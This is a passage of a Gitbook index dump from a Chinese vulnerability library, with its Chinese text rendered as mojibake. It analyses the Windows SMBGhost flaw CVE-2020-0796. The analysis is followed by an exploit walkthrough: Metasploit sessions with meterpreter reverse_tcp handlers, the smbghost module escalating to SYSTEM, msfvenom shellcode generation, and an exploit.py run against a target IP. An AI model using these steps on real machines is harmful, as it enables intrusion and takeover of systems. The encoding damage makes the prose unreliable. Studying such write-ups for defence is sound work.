CVE-2020-0796 Windows Win32k Êú¨Âú∞ÊèêÊùÉÊºèÊ¥û CVE-2021-1732 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Scan/":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Scan/","title":"Êâ´ÊèèÂ∑•ÂÖ∑","keywords":"","body":"Êâ´ÊèèÂ∑•ÂÖ∑ CVE-2020-0796 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ CVE-2020-0796.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ CVE-2020-0796.html","title":"Êâ´ÊèèÂ∑•ÂÖ∑ CVE-2020-0796","keywords":"","body":"Êâ´ÊèèÂ∑•ÂÖ∑ CVE-2020-0796 ScanÁõÆÂΩï‰ª•ÊîæÈíàÂØπ CVE-2020-0796 4Áßç‰∏çÂêåÂà©Áî®ÊñπÂºèÁöÑPOC Â•áÂÆâ‰ø° CVE-2020-0796 Êâ´Êèè‰∏ãËΩΩ Github CVE-2020-0796 ËìùÂ±èEXP ‰∏ãËΩΩ Github CVE-2020-0796 Êú¨Âú∞ÊèêÊùÉEXP ‰∏ãËΩΩ Github CVE-2020-0796 RCE EXP Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows SMBËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-0796.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows SMBËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-0796.html","title":"Windows SMBËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-0796","keywords":"","body":"Windows SMBËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-0796 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥3Êúà10Êó•ÔºåÂæÆËΩØÂú®ÂÖ∂ÂÆòÊñπSRCÂèëÂ∏É‰∫ÜCVE-2020-0796ÁöÑÂÆâÂÖ®ÂÖ¨ÂëäÔºàADV200005ÔºåMicrosoftGuidance for Disabling SMBv3 CompressionÔºâ,ÂÖ¨ÂëäË°®Á§∫Âú®Windows SMBv3ÁâàÊú¨ÁöÑÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Á´ØÂ≠òÂú®ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇÂêåÊó∂ÊåáÂá∫ËØ•ÊºèÊ¥ûÂ≠òÂú®‰∫éMicroSoft Server Message Block 3.1.1ÂçèËÆÆÂ§ÑÁêÜÁâπÂÆöËØ∑Ê±ÇÂåÖÁöÑÂäüËÉΩ‰∏≠ÔºåÊîªÂáªËÄÖÂà©Áî®ËØ•ÊºèÊ¥ûÂèØÂú®ÁõÆÊ†áSMB ServerÊàñËÄÖClient‰∏≠ÊâßË°å‰ªªÊÑè‰ª£Á†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] SMBÁâàÊú¨ v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) ÁéØÂ¢ÉÊê≠Âª∫ Âú®MSDN‰∏ä‰∏ãËΩΩÂØπÂ∫îÁöÑÂ≠òÂú®ÊºèÊ¥ûÁöÑÁ≥ªÁªüÁâàÊú¨ ÂÆâË£ÖÂêéÊâßË°åÂëΩ‰ª§ winver Êü•ÁúãÁ≥ªÁªüÁâàÊú¨ÔºåÂπ∂Êü•ÁúãÊòØÂê¶Âê´Êúâ KB4551762Ë°•‰∏Å ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂéüÁêÜ CVE-2020-0796ÊºèÊ¥ûÂ≠òÂú®‰∫éÂèóÂΩ±ÂìçÁâàÊú¨ÁöÑWindowsÈ©±Âä®srv2.sys‰∏≠„ÄÇWindows SMB v3.1.1 ÁâàÊú¨Â¢ûÂä†‰∫ÜÂØπÂéãÁº©Êï∞ÊçÆÁöÑÊîØÊåÅ„ÄÇÂõæ2ÊâÄÁ§∫‰∏∫Â∏¶ÂéãÁº©Êï∞ÊçÆÁöÑSMBÊï∞ÊçÆÊä•ÊñáÁöÑÊûÑÊàê„ÄÇ ProtocolIdÔºö4Â≠óËäÇÔºåÂõ∫ÂÆö‰∏∫0x424D53FC OriginalComressedSegmentSizeÔºö4Â≠óËäÇÔºåÂéüÂßãÁöÑÊú™ÂéãÁº©Êï∞ÊçÆÂ§ßÂ∞è CompressionAlgorithmÔºö2Â≠óËäÇÔºåÂéãÁº©ÁÆóÊ≥ï FlagsÔºö2Â≠óËäÇÔºåËØ¶ËßÅÂçèËÆÆÊñáÊ°£ Offset/LengthÔºöÊ†πÊçÆFlagsÁöÑÂèñÂÄº‰∏∫OffsetÊàñËÄÖLengthÔºåOffsetË°®Á§∫Êï∞ÊçÆÂåÖ‰∏≠ÂéãÁº©Êï∞ÊçÆÁõ∏ÂØπ‰∫éÂΩìÂâçÁªìÊûÑÁöÑÂÅèÁßª srv2.sys‰∏≠Â§ÑÁêÜSMBv3ÂéãÁº©Êï∞ÊçÆÂåÖÁöÑËß£ÂéãÂáΩÊï∞Srv2DecompressDataÊú™‰∏•Ê†ºÊ†°È™åÊï∞ÊçÆÂåÖ‰∏≠OriginalCompressedSegmentSizeÂíåOffset/LengthÂ≠óÊÆµÁöÑÂêàÊ≥ïÊÄß„ÄÇËÄåËøô‰∏§‰∏™Â≠óÊÆµÂΩ±Âìç‰∫ÜSrv2DecompressData‰∏≠ÂÜÖÂ≠òÂàÜÈÖçÂáΩÊï∞SrvNetAllocateBufferÁöÑÂèÇÊï∞„ÄÇÂ¶ÇÂõæ4ÊâÄÁ§∫ÁöÑSrv2DecompressDataÂáΩÊï∞ÂèçÁºñËØë‰ª£Á†ÅÔºåSrvNetAllocateBufferÂÆûÈôÖÁöÑÂèÇÊï∞‰∏∫OriginalCompressedSegmentSize+Offset„ÄÇËøô‰∏§‰∏™ÂèÇÊï∞ÈÉΩÁõ¥Êé•Êù•Ê∫ê‰∫éÊï∞ÊçÆÂåÖ‰∏≠SMB Compression Transform Header‰∏≠ÁöÑÂ≠óÊÆµÔºåËÄåÂáΩÊï∞Âπ∂Êú™Âà§Êñ≠Ëøô‰∏§‰∏™Â≠óÊÆµÊòØÂê¶ÂêàÊ≥ïÔºåÂ∞±Áõ¥Êé•Â∞ÜÂÖ∂Áõ∏Âä†Âêé‰Ωú‰∏∫ÂÜÖÂ≠òÂàÜÈÖçÁöÑÂèÇÊï∞(unsigned intÁ±ªÂûãÔºâ„ÄÇ ËøôÈáåÔºåOriginalCompressedSegmentSize+OffsetÂèØËÉΩÂ∞è‰∫éÂÆûÈôÖÈúÄË¶ÅÂàÜÈÖçÁöÑÂÜÖÂ≠òÂ§ßÂ∞èÔºå‰ªéËÄåÂú®ÂêéÁª≠Ë∞ÉÁî®Ëß£ÂéãÂáΩÊï∞SmbCompressionDecompressËøáÁ®ã‰∏≠Â≠òÂú®Ë∂äÁïåËØªÂèñÊàñËÄÖÂÜôÂÖ•ÁöÑÈ£éÈô©„ÄÇ ÁõÆÂâçÂ∑≤ÂÖ¨ÂºÄÁöÑÈíàÂØπËØ•ÊºèÊ¥ûÁöÑÊú¨Âú∞ÊèêÊùÉÂà©Áî®ÂåÖÂê´Â¶Ç‰∏ãÁöÑ‰∏ªË¶ÅËøáÁ®ãÔºö Ôºà1ÔºâÈ™åËØÅÁ®ãÂ∫èÈ¶ñÂÖàÂàõÂª∫Âà∞SMS serverÁöÑ‰ºöËØùËøûÊé•ÔºàËÆ∞‰∏∫sessionÔºâ„ÄÇ Ôºà2ÔºâÈ™åËØÅÁ®ãÂ∫èËé∑ÂèñËá™Ë∫´tokenÊï∞ÊçÆÁªìÊûÑ‰∏≠privilegeÊàêÂëòÂú®ÂÜÖÊ†∏‰∏≠ÁöÑÂú∞ÂùÄÔºàËÆ∞tokenAddrÔºâ„ÄÇ Ôºà3ÔºâÈ™åËØÅÁ®ãÂ∫èÈÄöËøásessionÂèëÈÄÅÁï∏ÂΩ¢ÂéãÁº©Êï∞ÊçÆÔºàËÆ∞‰∏∫evilDataÔºâÁªôSMB serverËß¶ÂèëÊºèÊ¥û„ÄÇÂÖ∂‰∏≠ÔºåevilDataÂåÖÂê´tokenAddr„ÄÅÊùÉÈôêÊï∞ÊçÆ„ÄÅÊ∫¢Âá∫Âç†‰ΩçÊï∞ÊçÆ„ÄÇ Ôºà4Ôºâ SMS serverÊî∂Âà∞evilDataÂêéËß¶ÂèëÊºèÊ¥ûÔºåÂπ∂‰øÆÊîπtokenAddrÂú∞ÂùÄÂ§ÑÁöÑÊùÉÈôêÊï∞ÊçÆÔºå‰ªéËÄåÊèêÂçáÈ™åËØÅÁ®ãÂ∫èÁöÑÊùÉÈôê„ÄÇ Ôºà5ÔºâÈ™åËØÅÁ®ãÂ∫èËé∑ÂèñÊùÉÈôêÂêéÂØπwinlogonËøõË°åÊéßÂà∂ÔºåÊù•ÂàõÂª∫systemÁî®Êà∑shell„ÄÇ È¶ñÂÖàÔºåÁúã‰∏Ä‰∏ãÂ∑≤ÂÖ¨ÂºÄÂà©Áî®ÁöÑevilDataÊï∞ÊçÆÂåÖ Êï∞ÊçÆÂåÖÁöÑÂÜÖÂÆπÂæàÁÆÄÂçïÔºåÂÖ∂‰∏≠Âá†‰∏™ÂÖ≥ÈîÆÂ≠óÊÆµÊï∞ÊçÆÂ¶Ç‰∏ãÔºö OriginalSize Ôºö0xffffffff OffsetÔºö0x10 Real compressed data Ôºö13Â≠óËäÇÁöÑÂéãÁº©Êï∞ÊçÆÔºåËß£ÂéãÂêéÂ∫î‰∏∫1108Â≠óËäÇ‚ÄôA‚ÄôÂä†8Â≠óËäÇÁöÑtokenÂú∞ÂùÄ„ÄÇ SMB3 raw data ÔºöÂÆûÈôÖ‰∏äÊòØÁî±2‰∏™8Â≠óËäÇÁöÑ0x1FF2FFFFBCÔºàÊÄªÈïø0x10)Âä†‰∏ä0x13Â≠óËäÇÁöÑÂéãÁº©Êï∞ÊçÆÁªÑÊàê ‰ªé‰∏äÈù¢ÁöÑÊºèÊ¥ûÂéüÁêÜÂàÜÊûêÂèØÁü•ÔºåÊºèÊ¥ûÊàêÂõ†ÊòØSrv2DecompressDataÂáΩÊï∞ÂØπÊä•ÊñáÂ≠óÊÆµÁº∫‰πèÂêàÊ≥ïÊÄßÂà§Êñ≠ÈÄ†ÊàêÂÜÖÂ≠òÂàÜÈÖç‰∏çÂΩì„ÄÇÂú®ËØ•ÊºèÊ¥ûÊï∞ÊçÆÂåÖ‰∏≠ÔºåOriginalSize ÊòØ‰∏Ä‰∏™Áï∏ÂΩ¢ÂÄº„ÄÇOriginalSize+ Offset = 0xffffffff + 0x10 = 0xf ÊòØ‰∏Ä‰∏™ÂæàÂ∞èÁöÑÂÄºÔºåÂÖ∂Â∞Ü‰ºö‰º†ÈÄíÁªôSrvNetAllocateBufferËøõË°åË∞ÉÁî®Ôºå‰∏ãÈù¢ÂÖ∑‰ΩìÂàÜÊûêÂÜÖÂ≠òÂàÜÈÖçÊÉÖÂÜµ„ÄÇSrvNetAllocateBufferÁöÑÂèçÁºñËØë‰ª£Á†Å Áî±‰∫é‰º†ÁªôSrvNetAllocateBufferÁöÑÂèÇÊï∞‰∏∫0xfÔºåÊ†πÊçÆSrvNetAllocateBufferÁöÑÂ§ÑÁêÜÊµÅÁ®ãÂèØÁü•ÔºåËØ•ËØ∑Ê±ÇÂÜÖÂ≠òÂ∞Ü‰ªéSrvNetBufferLookasidesË°®‰∏≠ÂàÜÈÖç„ÄÇËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂèòÈáèSrvDisableNetBufferLookAsideListË∑üÊ≥®ÂÜåË°®È°πÁõ∏ÂÖ≥ÔºåÁ≥ªÁªüÈªòËÆ§Áä∂ÊÄÅ‰∏ãSrvDisableNetBufferLookAsideList‰∏∫0„ÄÇ SrvNetBufferLookasidesË°®ÈÄöËøáÂáΩÊï∞SrvNetCreateBufferÂàùÂßãÂåñÔºåÂÆûÈôÖSrvNetCreateBufferÂæ™ÁéØË∞ÉÁî®‰∫ÜSrvNetBufferLookasideAllocateÂàÜÈÖçÂÜÖÂ≠òÔºåË∞ÉÁî®SrvNetBufferLookasideAllocateÁöÑÂèÇÊï∞ÂàÜÂà´‰∏∫[‚Äò0x1100‚Äô, ‚Äò0x2100‚Äô, ‚Äò0x4100‚Äô, ‚Äò0x8100‚Äô, ‚Äò0x10100‚Äô, ‚Äò0x20100‚Äô, ‚Äò0x40100‚Äô, ‚Äò0x80100‚Äô, ‚Äò0x100100‚Äô]„ÄÇÂú®ËøôÈáåÔºåÂÜÖÂ≠òÂàÜÈÖçÂèÇÊï∞‰∏∫0xfÔºåÂØπÂ∫îÁöÑlookasideË°®‰∏∫0x1100Â§ßÂ∞èÁöÑË°®È°π„ÄÇ SrvNetBufferLookasideAllocateÂáΩÊï∞ÂÆûÈôÖÊòØË∞ÉÁî®SrvNetAllocateBufferFromPoolÊù•ÂàÜÈÖçÂÜÖÂ≠ò Âú®ÂáΩÊï∞SrvNetAllocateBufferFromPool‰∏≠ÔºåÂØπ‰∫éÁî®Êà∑ËØ∑Ê±ÇÁöÑÂÜÖÂ≠òÂàÜÈÖçÂ§ßÂ∞èÔºåÂÜÖÈÉ®ÈÄöËøáExAllocatePoolWithTagÂáΩÊï∞ÂàÜÈÖçÁöÑÂÜÖÂ≠òÂÆûÈôÖË¶ÅÂ§ß‰∫éËØ∑Ê±ÇÂÄºÔºàÂ§öÂá∫ÈÉ®ÂàÜÁî®‰∫éÂ≠òÂÇ®ÈÉ®ÂàÜÂÜÖÂ≠òÁõ∏ÂÖ≥Êï∞ÊçÆÁªìÊûÑÔºâ„ÄÇ‰ª•ËØ∑Ê±ÇÂàÜÈÖç0x1100Â§ßÂ∞è‰∏∫‰æãÔºåÁªèËøá‰∏ÄÁ≥ªÂàóÂà§Êñ≠ÂêéÔºåÊúÄÂêéÂàÜÈÖçÁöÑÂÜÖÂ≠òÂ§ßÂ∞èallocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)„ÄÇ ÂÜÖÂ≠òÂàÜÈÖçÂÆåÊØï‰πãÂêéÔºåSrvNetAllocateBufferFromPoolÂáΩÊï∞ËøòÂØπÂàÜÈÖçÁöÑÂÜÖÂ≠òËøõË°å‰∫Ü‰∏ÄÁ≥ªÂàóÂàùÂßãÂåñÊìç‰ΩúÔºåÊúÄÂêéËøîÂõû‰∫Ü‰∏Ä‰∏™ÂÜÖÂ≠ò‰ø°ÊÅØÁªìÊûÑ‰ΩìÊåáÈíà‰Ωú‰∏∫ÂáΩÊï∞ÁöÑËøîÂõûÂÄº„ÄÇ ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÂ¶Ç‰∏ãÁöÑÊï∞ÊçÆÂÖ≥Á≥ªÔºöSrvNetAllocateBufferFromPoolÂáΩÊï∞ËøîÂõûÂÄºreturn_bufferÊåáÂêë‰∏Ä‰∏™ÂÜÖÂ≠òÊï∞ÊçÆÁªìÊûÑÔºåËØ•ÂÜÖÂ≠òÊï∞ÊçÆÁªìÊûÑËµ∑ÂßãÂú∞ÂùÄÂêåÂÆûÈôÖÂàÜÈÖçÂÜÖÂ≠òÔºàÂáΩÊï∞ExAllocatePoolWithTagÂàÜÈÖçÁöÑÂÜÖÂ≠òÔºâËµ∑ÂßãÂú∞ÂùÄÁöÑÁöÑÂÅèÁßª‰∏∫0x1150Ôºõreturn_buffer+0x18‰ΩçÁΩÆÊåáÂêë‰∫ÜÂÆûÈôÖÂàÜÈÖçÂÜÖÂ≠òËµ∑ÂßãÂú∞ÂùÄÂÅèÁßª0x50‰ΩçÁΩÆÂ§ÑÔºåËÄåÊúÄÁªàreturn_buffer‰ºö‰Ωú‰∏∫ÂáΩÊï∞SrvNetAllocateBufferÁöÑËøîÂõûÂÄº ÂõûÂà∞ÊºèÊ¥ûËß£ÂéãÂáΩÊï∞Srv2DecompressDataÔºåÂú®ËøõË°åÂÜÖÂ≠òÂàÜÈÖç‰πãÂêéÔºåSrv2DecompressDataË∞ÉÁî®ÂáΩÊï∞SmbCompressionDecompressÂºÄÂßãËß£ÂéãË¢´ÂéãÁº©ÁöÑÊï∞ÊçÆ ÂÆûÈôÖ‰∏äÔºåËØ•ÂáΩÊï∞Ë∞ÉÁî®‰∫ÜWindowsÂ∫ìÂáΩÊï∞RtlDecompressBufferEx2Êù•ÂÆûÁé∞Ëß£ÂéãÔºåÊ†πÊçÆRtlDecompressBufferEx2ÁöÑÂáΩÊï∞ÂéüÂûãÊù•ÂØπÂ∫îÂàÜÊûêSmbCompressionDecompressÂáΩÊï∞ÁöÑÂêÑ‰∏™ÂèÇÊï∞„ÄÇ SmbCompressionDecompress(CompressAlgoÔºå//ÂéãÁº©ÁÆóÊ≥ï Compressed_bufÔºå//ÊåáÂêëÊï∞ÊçÆÂåÖ‰∏≠ÁöÑÂéãÁº©Êï∞ÊçÆ Compressed_sizeÔºå//Êï∞ÊçÆÂåÖ‰∏≠ÂéãÁº©Êï∞ÊçÆÂ§ßÂ∞èÔºåËÆ°ÁÆóÂæóÂà∞ UnCompressedBuf,//Ëß£ÂéãÂêéÁöÑÊï∞ÊçÆÂ≠òÂÇ®Âú∞ÂùÄÔºå*(alloc_buffer+0x18)+0x10 UnCompressedSize,//ÂéãÁº©Êï∞ÊçÆÂéüÂßãÂ§ßÂ∞è,Ê∫ê‰∫éÊï∞ÊçÆÂåÖOriginalCompressedSegmentSize FinalUnCompressedSize)//ÊúÄÁªàËß£ÂéãÂêéÊï∞ÊçÆÂ§ßÂ∞è ‰ªéÂèçÁºñËØë‰ª£Á†ÅÂèØ‰ª•ÁúãÂá∫ÔºåÂáΩÊï∞SmbCompressionDecompress‰∏≠‰øùÂ≠òËß£ÂéãÂêéÊï∞ÊçÆÁöÑÂú∞ÂùÄ‰∏∫*(alloc_buffer+0x18)+0x10ÁöÑ‰ΩçÁΩÆÔºåÊ†πÊçÆÂÜÖÂ≠òÂàÜÈÖçËøáÁ®ãÂàÜÊûêÔºåalloc_buffer + 0x18ÊåáÂêë‰∫ÜÂÆûÈôÖÂÜÖÂ≠òÂàÜÈÖçËµ∑Âßã‰ΩçÁΩÆÂÅèÁßª0x50Â§ÑÔºåÊâÄ‰ª•Êã∑Ë¥ùÁõÆÁöÑÂú∞ÂùÄ‰∏∫ÂÆûÈôÖÂÜÖÂ≠òÂàÜÈÖçËµ∑ÂßãÂú∞ÂùÄÂÅèÁßª0x60‰ΩçÁΩÆÂ§Ñ„ÄÇ Âú®Ëß£ÂéãËøáÁ®ã‰∏≠ÔºåÂéãÁº©Êï∞ÊçÆËß£ÂéãÂêéÂ∞ÜÂ≠òÂÇ®Âà∞Ëøô‰∏™Âú∞ÂùÄÊåáÂêëÁöÑÂÜÖÂ≠ò‰∏≠„ÄÇÊ†πÊçÆevilDataÊï∞ÊçÆÁöÑÊûÑÈÄ†ËøáÁ®ãÔºåËß£ÂéãÂêéÁöÑÊï∞ÊçÆ‰∏∫Âç†ÂùëÊï∞ÊçÆÂíåtokenAddr„ÄÇÊã∑Ë¥ùÂà∞ËØ•Â§ÑÂú∞ÂùÄÂêéÔºåtokenAddrÂ∞ÜË¶ÜÁõñÂéüÂÜÖÂ≠òÊï∞ÊçÆÁªìÊûÑ‰∏≠alloc_buffer+0x18Â§ÑÁöÑÊï∞ÊçÆ„ÄÇ‰πüÂ∞±ÊòØËß£ÂéãÁº©ÂáΩÊï∞SmbCompressionDecompressËøîÂõûÂêéÔºåalloc_buffer+0x18Â∞ÜÊåáÂêëÈ™åËØÅÁ®ãÂ∫èÁöÑtokenAddrÂÜÖÊ†∏Âú∞ÂùÄ ÁªßÁª≠ÁúãSrv2DecompressDataÁöÑÂêéÁª≠Â§ÑÁêÜÊµÅÁ®ãÔºåËß£ÂéãÊàêÂäüÂêéÔºåÂáΩÊï∞Âà§Êñ≠offsetÁöÑÁªìÊûú‰∏ç‰∏∫0„ÄÇ‰∏ç‰∏∫0ÂàôËøõË°åÂÜÖÂ≠òÁßªÂä®ÔºåÂÜÖÂ≠òÊã∑Ë¥ùÁöÑÂèÇÊï∞Â¶Ç‰∏ãÔºö memmove(*(alloc_buffer+0x18)ÔºåSMB_payloadÔºåoffset) Ê≠§Êó∂alloc_buffer+0x18Â∑≤ÁªèÊåáÂêëÈ™åËØÅÁ®ãÂ∫èÁöÑtokenAddrÂÜÖÊ†∏Âú∞ÂùÄÔºåËÄåSMB_payloadÊ≠§Êó∂ÊåáÂêëevilData‰∏≠ÁöÑÊùÉÈôêÊï∞ÊçÆÔºåoffsetÂàô‰∏∫0x10„ÄÇÂõ†Ê≠§ÔºåËøô‰∏™ÂÜÖÂ≠òÁßªÂä®ÂÆåÊàêÂêéÔºåÊùÉÈôêÊï∞ÊçÆÂ∞ÜÂÜôÂÖ•tokenAddrÂ§Ñ„ÄÇËøôÊÑèÂë≥ÁùÄÔºåSMS ServerÊàêÂäü‰øÆÊîπ‰∫ÜÈ™åËØÅÁ®ãÂ∫èÁöÑÊùÉÈôêÔºå‰ªéËÄåÂÆûÁé∞‰∫ÜÈ™åËØÅÁ®ãÂ∫èÁöÑÊèêÊùÉÔºÅ ËøòÊúâ‰∏Ä‰∏™ÁªÜËäÇÈúÄË¶ÅÊ≥®ÊÑèÔºåÂú®Ëß£ÂéãÊó∂ÔºåSrv2DecompressDataÂáΩÊï∞‰ºöÂà§Êñ≠ÂÆûÈôÖÁöÑËß£ÂéãÂêéÊï∞ÊçÆÂ§ßÂ∞èFinalUnCompressedSizeÊòØÂê¶ÂíåÊï∞ÊçÆÂåÖ‰∏≠ÂéüÂßãÊï∞ÊçÆÂ§ßÂ∞èOriginalCompressedSegmentSize‰∏ÄËá¥ ÊåâÁêÜÊù•ËØ¥ÂÆûÈôÖËß£ÂéãÂêéÁöÑÊï∞ÊçÆÂ§ßÂ∞è‰∏∫0x1100Ôºå‰∏çÁ≠â‰∫éÊï∞ÊçÆÂåÖ‰∏≠ÁöÑÂéüÂßãÂéãÁº©Êï∞ÊçÆÂ§ßÂ∞è0xffffffffÔºåËøôÈáåÂ∫îËØ•ËøõÂÖ•Âà∞ÂêéÈù¢ÂÜÖÂ≠òÈáäÊîæÁöÑÊµÅÁ®ã„ÄÇÁÑ∂ËÄåÔºåÂÆûÈôÖ‰∏äÂú®ÂáΩÊï∞SmbCompressionDecompress‰∏≠ÔºåË∞ÉÁî®RtlDecompressBufferEx2ÊàêÂäüÂêé‰ºöÁõ¥Êé•Â∞ÜOriginalCompressedSegmentSizeËµãÂÄºÁªôFinalUnCompressedSize„ÄÇËøô‰πüÊòØËØ•ÊºèÊ¥ûÂÖ≥‰∫é‰ªªÊÑèÂú∞ÂùÄÂÜôÂÖ•ÊàêÂäüÁöÑÂÖ≥ÈîÆ‰πã‰∏Ä„ÄÇ CVE-2020-0796 ÁõÆÊ†áÊé¢Êµã(Â•áÂÆâ‰ø°) ‰ΩøÁî®Â•áÂÆâ‰ø°ÁöÑÊºèÊ¥ûÊâ´ÊèèÊù•Êé¢Êµã Â•áÂÆâ‰ø° CVE-2020-0796 Êâ´Êèè‰∏ãËΩΩ CVE-2020-0796 ËìùÂ±èEXP Github CVE-2020-0796 ËìùÂ±èEXP ‰∏ãËΩΩ ËøêË°åËÑöÊú¨ÂêéÁõÆÊ†áÊàêÂäüËìùÂ±è CVE-2020-0796 Êú¨Âú∞ÊèêÊùÉEXP Github CVE-2020-0796 Êú¨Âú∞ÊèêÊùÉEXP ‰∏ãËΩΩ ËøêË°åÂ∫îÁî®Á®ãÂ∫èÂêéÂºπÂá∫cmdÁ™óÂè£‰∏∫ systemÊùÉÈôê ÊàñËÄÖ‰ΩøÁî® MSFÁöÑÂÜÖÁΩÆEXP windows/local/cve_2020_0796_smbghost Êù•Êú¨Âú∞ÊèêÊùÉ msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP Github CVE-2020-0796 RCE EXP msfvenomÁîüÊàêreversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py Â∞ÜÁîüÊàêexp.py‰∏≠ÁöÑshellcodeÊõøÊç¢exploit.py‰∏≠ÁöÑshellcode [!NOTE] buf Ë¶ÅÊõøÊç¢‰∏∫ USER_PAYLOAD ‰ΩøÁî® MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit ÊâßË°åËÑöÊú¨Âç≥ÂèØ python3 exploit.py -ip 192.168.1.110 [!NOTE] Ê≥®ÊÑèÊúâËìùÂ±èÊ¶ÇÁéá ÂèÇËÄÉÊñáÁ´† Windows SMB GhostÔºàCVE-2020-0796ÔºâÊºèÊ¥ûÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows CryptoAPIÊ¨∫È™óÊºèÊ¥û CVE-2020-0601.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows CryptoAPIÊ¨∫È™óÊºèÊ¥û CVE-2020-0601.html","title":"Windows CryptoAPIÊ¨∫È™óÊºèÊ¥û CVE-2020-0601","keywords":"","body":"Windows CryptoAPIÊ¨∫È™óÊºèÊ¥û CVE-2020-0601 ÊºèÊ¥ûÊèèËø∞ 